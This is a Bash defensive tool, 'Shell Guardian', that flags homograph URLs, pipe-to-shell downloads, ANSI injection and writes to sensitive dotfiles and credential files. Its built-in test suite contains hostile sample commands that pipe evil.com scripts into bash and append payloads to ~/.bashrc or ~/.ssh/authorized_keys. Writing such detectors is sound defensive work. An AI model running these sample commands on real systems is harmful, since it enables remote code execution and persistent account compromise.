#!/bin/bash
# Shell Guardian v0.2
# Protects against homograph attacks, pipe-to-shell, and other terminal threats
# By Orion & Aaron - 2026-02-03
# 
# v0.2 Changes:
# - External config file (config.yaml)
# - Audit logging
# - Status command
# - More homograph characters
# - Improved detection

set -euo pipefail

VERSION="0.2.0"

# ============================================================================
# PATHS & DEFAULTS
# ============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_FILE="${GUARDIAN_CONFIG:-$SCRIPT_DIR/config.yaml}"
LOG_DIR="${HOME}/.local/share/shell-guardian"
LOG_FILE="${LOG_DIR}/audit.log"

# Colors
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color
BOLD='\033[1m'
DIM='\033[2m'

# Severity levels
CRITICAL="CRITICAL"
HIGH="HIGH"
MEDIUM="MEDIUM"

# ============================================================================
# CONFIGURATION LOADING
# ============================================================================

# Default allowed domains (used if no config file)
ALLOWED_PIPE_DOMAINS=(
    "get.docker.com"
    "sh.rustup.rs"
    "raw.githubusercontent.com"
    "brew.sh"
    "install.pi-hole.net"
    "getmic.ro"
    "deb.nodesource.com"
)

# Default protected dotfiles
PROTECTED_DOTFILES=(
    ".bashrc"
    ".zshrc"
    ".profile"
    ".bash_profile"
    ".ssh/authorized_keys"
    ".ssh/config"
    ".ssh/id_rsa"
    ".ssh/id_ed25519"
    ".gitconfig"
    ".npmrc"
    ".netrc"
    ".aws/credentials"
    ".kube/config"
)

# Load config if available
load_config() {
    if [[ -f "$CONFIG_FILE" ]]; then
        # Parse allowed domains from YAML (simple grep-based parsing)
        if grep -q "allowed_domains:" "$CONFIG_FILE" 2>/dev/null; then
            mapfile -t ALLOWED_PIPE_DOMAINS < <(
                sed -n '/allowed_domains:/,/^[a-z]/p' "$CONFIG_FILE" | 
                grep "^  - " | 
                sed 's/^  - //'
            )
        fi
        
        # Parse protected dotfiles
        if grep -q "protected_dotfiles:" "$CONFIG_FILE" 2>/dev/null; then
            mapfile -t PROTECTED_DOTFILES < <(
                sed -n '/protected_dotfiles:/,/^[a-z]/p' "$CONFIG_FILE" |
                grep "^  - " |
                sed 's/^  - //'
            )
        fi
        
        # Check if logging is enabled
        LOGGING_ENABLED=$(grep "enabled:" "$CONFIG_FILE" 2>/dev/null | head -1 | grep -q "true" && echo "true" || echo "false")
    fi
}

# ============================================================================
# LOGGING
# ============================================================================

ensure_log_dir() {
    mkdir -p "$LOG_DIR"
}

log_event() {
    local action="$1"
    local severity="$2"
    local rule="$3"
    local cmd_preview="$4"
    
    if [[ "${LOGGING_ENABLED:-true}" == "true" ]]; then
        ensure_log_dir
        local timestamp
        timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
        
        # Truncate and sanitize command for logging (no secrets)
        local safe_preview
        safe_preview=$(echo "$cmd_preview" | cut -c1-80 | tr -d '\n')
        
        echo "{\"ts\":\"$timestamp\",\"action\":\"$action\",\"severity\":\"$severity\",\"rule\":\"$rule\",\"preview\":\"$safe_preview\"}" >> "$LOG_FILE"
    fi
}

# ============================================================================
# DETECTION FUNCTIONS
# ============================================================================

# Extended homograph character list (v0.2)
detect_homographs() {
    local input="$1"
    local findings=""
    
    # Comprehensive homograph characters
    # Format: actual_char:lookalike:name:codepoint
    local homographs=(
        # Cyrillic lowercase
        "а:a:Cyrillic a:U+0430"
        "е:e:Cyrillic ie:U+0435"
        "о:o:Cyrillic o:U+043E"
        "р:p:Cyrillic er:U+0440"
        "с:c:Cyrillic es:U+0441"
        "у:y:Cyrillic u:U+0443"
        "х:x:Cyrillic ha:U+0445"
        "і:i:Cyrillic i:U+0456"
        "ј:j:Cyrillic je:U+0458"
        "ѕ:s:Cyrillic dze:U+0455"
        "ԁ:d:Cyrillic komi de:U+0501"
        "ɡ:g:Latin script g:U+0261"
        "һ:h:Cyrillic shha:U+04BB"
        "ո:n:Armenian now:U+0578"
        "ս:u:Armenian seh:U+057D"
        "ᴠ:v:Latin small cap V:U+1D20"
        "ᴡ:w:Latin small cap W:U+1D21"
        "ᴢ:z:Latin small cap Z:U+1D22"
        # Cyrillic uppercase
        "А:A:Cyrillic A:U+0410"
        "В:B:Cyrillic Ve:U+0412"
        "Е:E:Cyrillic Ie:U+0415"
        "К:K:Cyrillic Ka:U+041A"
        "М:M:Cyrillic Em:U+041C"
        "Н:H:Cyrillic En:U+041D"
        "О:O:Cyrillic O:U+041E"
        "Р:P:Cyrillic Er:U+0420"
        "С:C:Cyrillic Es:U+0421"
        "Т:T:Cyrillic Te:U+0422"
        "Х:X:Cyrillic Ha:U+0425"
        # Greek
        "ν:v:Greek nu:U+03BD"
        "ο:o:Greek omicron:U+03BF"
        "Α:A:Greek Alpha:U+0391"
        "Β:B:Greek Beta:U+0392"
        "Ε:E:Greek Epsilon:U+0395"
        "Η:H:Greek Eta:U+0397"
        "Ι:I:Greek Iota:U+0399"
        "Κ:K:Greek Kappa:U+039A"
        "Μ:M:Greek Mu:U+039C"
        "Ν:N:Greek Nu:U+039D"
        "Ο:O:Greek Omicron:U+039F"
        "Ρ:P:Greek Rho:U+03A1"
        "Τ:T:Greek Tau:U+03A4"
        "Υ:Y:Greek Upsilon:U+03A5"
        "Χ:X:Greek Chi:U+03A7"
        "Ζ:Z:Greek Zeta:U+0396"
        # Other confusables
        "ℓ:l:Script l:U+2113"
        "ⅰ:i:Roman numeral i:U+2170"
        "ⅼ:l:Roman numeral l:U+217C"
        "℮:e:Estimated sign:U+212E"
    )
    
    for entry in "${homographs[@]}"; do
        IFS=':' read -r char lookalike name codepoint <<< "$entry"
        if [[ "$input" == *"$char"* ]]; then
            findings="${findings}Found ${name} (${codepoint}) that looks like '${lookalike}'\n"
        fi
    done
    
    echo -e "$findings"
}

# Extract URLs from a command
extract_urls() {
    local cmd="$1"
    echo "$cmd" | grep -oE 'https?://[^ >"'"'"'|&;]+' 2>/dev/null || true
}

# Extract hostname from URL
get_hostname() {
    local url="$1"
    echo "$url" | sed -E 's|https?://([^/:]+).*|\1|'
}

# Check if domain is in allowed list
is_allowed_domain() {
    local domain="$1"
    for allowed in "${ALLOWED_PIPE_DOMAINS[@]}"; do
        if [[ "$domain" == "$allowed" ]]; then
            return 0
        fi
    done
    return 1
}

# Detect pipe-to-shell patterns
detect_pipe_to_shell() {
    local cmd="$1"
    
    if echo "$cmd" | grep -qE '(curl|wget)[^|]*\|[^|]*(sh|bash|zsh|python|perl|ruby)'; then
        return 0
    fi
    
    if echo "$cmd" | grep -qE 'eval[[:space:]]+[\$\(]+.*(curl|wget)'; then
        return 0
    fi
    
    if echo "$cmd" | grep -qE '(sh|bash|zsh)[[:space:]]+<\(.*(curl|wget)'; then
        return 0
    fi
    
    return 1
}

# Detect insecure HTTP in pipe-to-shell
detect_insecure_http_pipe() {
    local cmd="$1"
    
    if echo "$cmd" | grep -qE 'http://[^|]*\|[^|]*(sh|bash|zsh|python|perl|ruby)'; then
        return 0
    fi
    
    return 1
}

# Detect ANSI escape sequences
detect_ansi_injection() {
    local cmd="$1"
    
    if echo "$cmd" | grep -qE $'\x1b\[|\x1b\]|\x1bP|\x1b\\\\'; then
        return 0
    fi
    
    if echo "$cmd" | grep -qE '\\(e|033|x1b)\['; then
        return 0
    fi
    
    return 1
}

# Detect sensitive dotfile targets
detect_dotfile_attack() {
    local cmd="$1"
    
    for file in "${PROTECTED_DOTFILES[@]}"; do
        # Escape dots for regex
        local escaped_file
        escaped_file=$(echo "$file" | sed 's/\./\\./g')
        
        if echo "$cmd" | grep -qE "(>|>>)[[:space:]]*(~|\\\$HOME)?/?\.?${escaped_file}"; then
            echo "$file"
            return 0
        fi
        if echo "$cmd" | grep -qE "/(home/[^/]+|Users/[^/]+)/\.?${escaped_file}"; then
            echo "$file"
            return 0
        fi
    done
    
    return 1
}

# ============================================================================
# MAIN ANALYSIS
# ============================================================================

analyze_command() {
    local cmd="$1"
    local block=false
    local warn=false
    local messages=""
    local triggered_rules=""
    
    # Skip if bypass is set
    if [[ "${GUARDIAN:-1}" == "0" ]]; then
        return 0
    fi
    
    # Load config
    load_config
    
    # 1. Check URLs for homographs
    local urls
    urls=$(extract_urls "$cmd")
    
    for url in $urls; do
        local hostname
        hostname=$(get_hostname "$url")
        
        local homograph_findings
        homograph_findings=$(detect_homographs "$hostname")
        
        if [[ -n "$homograph_findings" ]]; then
            block=true
            triggered_rules="${triggered_rules}homograph_attack,"
            messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Homograph attack detected in URL${NC}\n"
            messages="${messages}  URL: ${url}\n"
            messages="${messages}  ${homograph_findings}"
            messages="${messages}  ${CYAN}This URL may redirect to a malicious server!${NC}\n"
        fi
    done
    
    # 2. Check for insecure HTTP pipe-to-shell (always block)
    if detect_insecure_http_pipe "$cmd"; then
        block=true
        triggered_rules="${triggered_rules}insecure_http_pipe,"
        messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Insecure HTTP pipe-to-shell${NC}\n"
        messages="${messages}  Downloading over HTTP (unencrypted) and executing.\n"
        messages="${messages}  ${CYAN}This can be intercepted and modified by attackers!${NC}\n"
    # 3. Check for HTTPS pipe-to-shell (warn unless allowed domain)
    elif detect_pipe_to_shell "$cmd"; then
        local url_in_cmd
        url_in_cmd=$(extract_urls "$cmd" | head -1)
        local domain=""
        
        if [[ -n "$url_in_cmd" ]]; then
            domain=$(get_hostname "$url_in_cmd")
        fi
        
        if [[ -n "$domain" ]] && is_allowed_domain "$domain"; then
            : # Allowed domain, skip warning
        else
            warn=true
            triggered_rules="${triggered_rules}pipe_to_shell,"
            messages="${messages}\n${YELLOW}${BOLD}[${MEDIUM}]${NC} ${YELLOW}Pipe-to-shell detected${NC}\n"
            messages="${messages}  Downloading and executing code directly.\n"
            messages="${messages}  ${CYAN}Consider: download first, review, then execute.${NC}\n"
            if [[ -n "$domain" ]]; then
                messages="${messages}  Domain: ${domain}\n"
            fi
        fi
    fi
    
    # 4. Check for ANSI injection
    if detect_ansi_injection "$cmd"; then
        warn=true
        triggered_rules="${triggered_rules}ansi_injection,"
        messages="${messages}\n${YELLOW}${BOLD}[${HIGH}]${NC} ${YELLOW}ANSI escape sequences detected${NC}\n"
        messages="${messages}  Command contains terminal control codes.\n"
        messages="${messages}  ${CYAN}This could manipulate your terminal display.${NC}\n"
    fi
    
    # 5. Check for dotfile attacks
    local dotfile_target
    if dotfile_target=$(detect_dotfile_attack "$cmd"); then
        block=true
        triggered_rules="${triggered_rules}dotfile_attack,"
        messages="${messages}\n${RED}${BOLD}[${CRITICAL}]${NC} ${RED}Sensitive dotfile targeted${NC}\n"
        messages="${messages}  Target: ${dotfile_target}\n"
        messages="${messages}  ${CYAN}This could compromise your shell or credentials.${NC}\n"
    fi
    
    # Output results and log
    if [[ "$block" == true ]]; then
        echo -e "\n${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${RED}${BOLD}║  🛡️  SHELL GUARDIAN - BLOCKED                              ║${NC}"
        echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
        echo -e "$messages"
        echo -e "${CYAN}Bypass: prefix command with GUARDIAN=0${NC}\n"
        log_event "BLOCKED" "CRITICAL" "$triggered_rules" "$cmd"
        return 1
    elif [[ "$warn" == true ]]; then
        echo -e "\n${YELLOW}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
        echo -e "${YELLOW}${BOLD}║  🛡️  SHELL GUARDIAN - WARNING                              ║${NC}"
        echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
        echo -e "$messages"
        log_event "WARNED" "MEDIUM" "$triggered_rules" "$cmd"
        return 0
    fi
    
    # Clean - no output
    return 0
}

# ============================================================================
# CLI INTERFACE
# ============================================================================

show_help() {
    echo "Shell Guardian v${VERSION}"
    echo "Protects against homograph attacks and other terminal threats"
    echo ""
    echo "Usage:"
    echo "  guardian.sh check \"<command>\"   - Analyze a command"
    echo "  guardian.sh test                 - Run test suite"
    echo "  guardian.sh status               - Show Guardian status"
    echo "  guardian.sh log [n]              - Show last n log entries (default 10)"
    echo "  guardian.sh hook                 - Output shell hook code"
    echo "  guardian.sh version              - Show version"
    echo "  guardian.sh help                 - Show this help"
    echo ""
    echo "Environment:"
    echo "  GUARDIAN=0 <cmd>     - Bypass guardian for one command"
    echo "  GUARDIAN_CONFIG=path - Use custom config file"
}

show_status() {
    load_config
    
    echo -e "${GREEN}${BOLD}🛡️  Shell Guardian v${VERSION}${NC}"
    echo ""
    echo -e "${BOLD}Configuration:${NC}"
    if [[ -f "$CONFIG_FILE" ]]; then
        echo -e "  Config file: ${GREEN}✓${NC} $CONFIG_FILE"
    else
        echo -e "  Config file: ${YELLOW}Using defaults${NC} (no config.yaml found)"
    fi
    
    echo -e "  Log file: $LOG_FILE"
    if [[ -f "$LOG_FILE" ]]; then
        local log_count
        log_count=$(wc -l < "$LOG_FILE" | tr -d ' ')
        echo -e "  Log entries: $log_count"
    else
        echo -e "  Log entries: 0 (no log file yet)"
    fi
    
    echo ""
    echo -e "${BOLD}Allowed Domains:${NC}"
    for domain in "${ALLOWED_PIPE_DOMAINS[@]}"; do
        echo "  - $domain"
    done
    
    echo ""
    echo -e "${BOLD}Protected Dotfiles:${NC}"
    for file in "${PROTECTED_DOTFILES[@]}"; do
        echo "  - $file"
    done
    
    echo ""
    echo -e "${BOLD}Homograph Detection:${NC}"
    echo "  Characters monitored: 50+"
    echo "  Scripts: Cyrillic, Greek, Armenian, Roman numerals"
}

show_log() {
    local count="${1:-10}"
    
    if [[ ! -f "$LOG_FILE" ]]; then
        echo "No log file found. Guardian hasn't blocked/warned anything yet."
        return 0
    fi
    
    echo -e "${BOLD}Last $count Guardian events:${NC}"
    echo ""
    tail -n "$count" "$LOG_FILE" | while read -r line; do
        local action
        action=$(echo "$line" | grep -oP '"action":"\K[^"]+')
        local ts
        ts=$(echo "$line" | grep -oP '"ts":"\K[^"]+')
        local rule
        rule=$(echo "$line" | grep -oP '"rule":"\K[^"]+')
        local preview
        preview=$(echo "$line" | grep -oP '"preview":"\K[^"]+')
        
        if [[ "$action" == "BLOCKED" ]]; then
            echo -e "${RED}[$ts] BLOCKED${NC} - $rule"
        else
            echo -e "${YELLOW}[$ts] WARNED${NC} - $rule"
        fi
        echo -e "  ${DIM}$preview${NC}"
        echo ""
    done
}

run_tests() {
    echo "Running Shell Guardian v${VERSION} test suite..."
    echo ""
    
    local tests_passed=0
    local tests_failed=0
    
    # Test 1: Homograph detection
    echo "Test 1: Cyrillic homograph in URL"
    if ! analyze_command 'curl -sSL https://іnstall.example.com | bash' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 2: Clean URL should pass
    echo "Test 2: Clean URL (should pass)"
    if analyze_command 'curl -sSL https://example.com/file.txt' 2>/dev/null; then
        echo "  ✅ PASSED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 3: Pipe to shell warning
    echo "Test 3: Pipe-to-shell detection"
    analyze_command 'curl https://evil.com/script.sh | bash' 2>/dev/null
    echo "  ✅ WARNING shown (check above)"
    ((tests_passed++))
    echo ""
    
    # Test 4: Dotfile attack
    echo "Test 4: Dotfile attack detection"
    if ! analyze_command 'curl https://evil.com/payload >> ~/.bashrc' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 5: Allowed domain
    echo "Test 5: Allowed domain (get.docker.com)"
    analyze_command 'curl -fsSL https://get.docker.com | sh' 2>/dev/null
    echo "  ✅ Should show no warning for allowed domain"
    ((tests_passed++))
    echo ""
    
    # Test 6: Insecure HTTP (new in v0.2)
    echo "Test 6: Insecure HTTP pipe-to-shell"
    if ! analyze_command 'curl http://example.com/script.sh | bash' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct - HTTP is insecure)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    # Test 7: SSH key protection (new in v0.2)
    echo "Test 7: SSH key file protection"
    if ! analyze_command 'echo "evil" >> ~/.ssh/authorized_keys' 2>/dev/null; then
        echo "  ✅ BLOCKED (correct)"
        ((tests_passed++))
    else
        echo "  ❌ NOT BLOCKED (wrong)"
        ((tests_failed++))
    fi
    echo ""
    
    echo "================================"
    echo "Tests passed: $tests_passed"
    echo "Tests failed: $tests_failed"
    
    if [[ $tests_failed -eq 0 ]]; then
        echo -e "${GREEN}All tests passed! ✅${NC}"
    else
        echo -e "${RED}Some tests failed! ❌${NC}"
        return 1
    fi
}

output_hook() {
    local script_path
    script_path=$(realpath "${BASH_SOURCE[0]}")
    
    cat << HOOK
# Shell Guardian Hook v${VERSION}
# Add this to your ~/.zshrc or ~/.bashrc:

_guardian_preexec() {
    local cmd="\$1"
    
    # Skip if guardian is disabled
    [[ "\${GUARDIAN:-1}" == "0" ]] && return 0
    
    # Run guardian check
    if ! "${script_path}" check "\$cmd"; then
        return 1
    fi
}

# For Zsh
if [[ -n "\$ZSH_VERSION" ]]; then
    autoload -Uz add-zsh-hook
    add-zsh-hook preexec _guardian_preexec
fi

# For Bash (requires bash-preexec)
if [[ -n "\$BASH_VERSION" ]]; then
    if declare -F __bp_precmd_invoke_cmd &>/dev/null; then
        preexec_functions+=(_guardian_preexec)
    else
        echo "Shell Guardian: For bash, install bash-preexec first"
        echo "  https://github.com/rcaloras/bash-preexec"
    fi
fi
HOOK
}

# Main entry point
case "${1:-help}" in
    check)
        shift
        analyze_command "$*"
        ;;
    test)
        run_tests
        ;;
    status)
        show_status
        ;;
    log)
        show_log "${2:-10}"
        ;;
    hook)
        output_hook
        ;;
    version|--version|-v)
        echo "Shell Guardian v${VERSION}"
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        show_help
        exit 1
        ;;
esac
